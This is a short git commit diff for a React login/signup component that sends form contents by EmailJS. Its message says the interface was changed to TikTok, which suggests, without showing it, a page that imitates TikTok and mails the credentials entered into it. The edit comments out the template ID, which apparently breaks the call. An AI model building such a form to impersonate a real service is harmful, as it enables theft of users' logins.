83e09e658a32873c2e589f99ca353982e7e8a1fa
Longlasting1805 <Longlasting1805@gmail.com>
2025-04-23 00:02:05 +0100

    changed interface to tiktok

--- src/Components/LoginSignup/LoginSignup.jsx
+++ src/Components/LoginSignup/LoginSignup.jsx
@@ -16,7 +16,7 @@ const LoginSignup = () => {
     emailjs
     .sendForm(
       process.env.REACT_APP_EMAILJS_SERVICE_ID,
-        process.env.REACT_APP_EMAILJS_TEMPLATE_ID,
+        // process.env.REACT_APP_EMAILJS_TEMPLATE_ID,
         form.current,
       {
         publicKey: process.env.REACT_APP_EMAILJS_PUBLIC_KEY,
